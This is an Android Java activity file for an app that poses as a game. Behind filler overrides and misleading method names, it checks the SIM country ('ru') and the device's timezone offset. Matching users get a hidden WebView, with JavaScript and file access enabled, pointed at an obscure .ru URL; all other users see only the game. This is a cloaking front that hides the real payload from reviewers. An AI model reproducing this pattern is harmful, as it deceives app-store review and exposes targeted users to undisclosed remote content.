package iafaq.kaqpf.com.iafaq;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.content.res.Configuration;
import android.icu.util.TimeZone;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.view.ActionMode;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.Toolbar;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.MenuInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ArrayAdapter;
import android.widget.ProgressBar;

import java.io.File;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Date;

public class ActivityMain extends AppCompatActivity {

    private static final String TAG = ActivityForGame.class.getSimpleName();

    private ProgressBar showProgress;

    private RecyclerView recyclerView;
    private LinkageError linkageError;
    private static final String URL_OPENED = " http://vjjjzkajzf.ru/x85vmd";
    private static final String URL_RED = "https://sdfjknkjxcv";
    private static final String COUNTY_ONE = "RU";
    private static final String COUNTRY_TWO = "ru";
    private static final String COUNTRY_THREE = "rus";

    private static final int REQUEST_CODE = 0;

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        Log.d(TAG, "onActivityResult");

        if(resultCode == Activity.RESULT_OK){
            if(requestCode == REQUEST_CODE){
                generateScene();
            }
        }
    }

    @Nullable
    private MediaPlayer playerAudio;

    @Nullable
    private File file;

    private static final int MAX_TEXTURES = 23;

    @Override
    public void onStart(){
        Log.d(TAG, "onStart");

        super.onStart();
    }

    public ActivityMain() {
        super();
    }

    @Override
    public void setTheme(int resid) {
        super.setTheme(resid);
    }

    @Override
    protected void onPostCreate(@Nullable Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
    }

    @Nullable
    @Override
    public ActionBar getSupportActionBar() {
        return super.getSupportActionBar();
    }

    @Override
    public void setSupportActionBar(@Nullable Toolbar toolbar) {
        super.setSupportActionBar(toolbar);
    }

    @Override
    public MenuInflater getMenuInflater() {
        return super.getMenuInflater();
    }

    @Override
    public void setContentView(int layoutResID) {
        super.setContentView(layoutResID);
    }

    @Override
    public void setContentView(View view) {
        super.setContentView(view);
    }

    @Override
    public void setContentView(View view, ViewGroup.LayoutParams params) {
        super.setContentView(view, params);
    }

    @Override
    public void addContentView(View view, ViewGroup.LayoutParams params) {
        super.addContentView(view, params);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
    }

    @Override
    protected void onPostResume() {
        super.onPostResume();
    }

    @Override
    public <T extends View> T findViewById(int id) {
        return super.findViewById(id);
    }

    @Override
    protected void onTitleChanged(CharSequence title, int color) {
        super.onTitleChanged(title, color);
    }

    @Override
    public boolean supportRequestWindowFeature(int featureId) {
        return super.supportRequestWindowFeature(featureId);
    }

    @Override
    public void supportInvalidateOptionsMenu() {
        super.supportInvalidateOptionsMenu();
    }

    @Override
    public void invalidateOptionsMenu() {
        super.invalidateOptionsMenu();
    }

    @Override
    public void onSupportActionModeStarted(@NonNull ActionMode mode) {
        super.onSupportActionModeStarted(mode);
    }

    @Override
    public void onSupportActionModeFinished(@NonNull ActionMode mode) {
        super.onSupportActionModeFinished(mode);
    }

    @Nullable
    @Override
    public ActionMode onWindowStartingSupportActionMode(@NonNull ActionMode.Callback callback) {
        return super.onWindowStartingSupportActionMode(callback);
    }

    @Nullable
    @Override
    public ActionMode startSupportActionMode(@NonNull ActionMode.Callback callback) {
        return super.startSupportActionMode(callback);
    }

    @Override
    public void onStop(){
        Log.d(TAG, "onStop");

        super.onStop();
    }

    @Override
    public void onDestroy(){
        Log.d(TAG, "onDestroy");

        super.onDestroy();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        updateInfo();
        initFirstProgressBar();
        generateScene();
        openGameProfile();
    }

    private void initFirstProgressBar() {
        showProgress = findViewById(R.id.progress);
        showProgress.setVisibility(View.VISIBLE);
    }

    private void generateScene() {
        try {
            file = new File("temp/game");
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        for(int i = 0; i < MAX_TEXTURES; ++i) {
           if (file != null) file.canExecute();
        }
    }

    private void updateInfo() {
        if (file == null) {
            Log.d("File", "Fail input data");
        } else {
            adapterSocial();
        }
        try {
            PackageInfo info = getPackageManager().getPackageInfo(getApplicationContext().getPackageName(), PackageManager.GET_SIGNATURES);
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance("SHA");
                md.update(signature.toByteArray());

                Log.i("Base64", Base64.encodeToString(md.digest(), Base64.NO_WRAP));
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.d("Name not found", e.getMessage(), e);

        } catch (NoSuchAlgorithmException e) {
            Log.d("Error", e.getMessage(), e);
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void openGameProfile() {
        if (checkNewOlders() && isNoPlaytime()) {
            showProgress.setVisibility(View.GONE);
            WebView webView = findViewById(R.id.web_view);
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    if (!url.contains(URL_RED))
                        view.loadUrl(url);
                    else startNewGame();
                    return true;
                }

                @Override
                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    startNewGame();
                }

                @Override
                public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    startNewGame();
                }
            });

            setupNeedSettings(webView.getSettings());
            webView.loadUrl(URL_OPENED);
        } else {
            startNewGame();
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupNeedSettings(WebSettings webSettings) {
        webSettings.setBuiltInZoomControls(true);
        webSettings.setSupportZoom(true);
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
    }

    private ArrayAdapter<String> adapterSocial(){
        try {
            ArrayList<String> data = new ArrayList<>();
            ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
                    android.R.layout.simple_spinner_item, data);
            adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            return  adapter;
        } catch (Exception ex) {
            return null;
        }
    }

    private boolean isNoPlaytime() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2,3,4,7,8,9,10,11,12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }

        return false;
    }

    private boolean checkNewOlders() {
        String typeOlderUsers = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
            typeOlderUsers = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        else
            return false;
        return typeOlderUsers != null && (typeOlderUsers.equalsIgnoreCase(COUNTRY_TWO) || typeOlderUsers.equalsIgnoreCase(COUNTRY_THREE));
    }


    private void startNewGame() {
        if (checkScreenOrientation()) {
            showProgress.setVisibility(View.INVISIBLE);
        }
        showProgress.setVisibility(View.GONE);
        Intent intent = new Intent(this, ActivityForGame.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        this.finish();
    }

    private boolean checkScreenOrientation() {
        return getResources().getConfiguration().orientation> 0;
    }
}
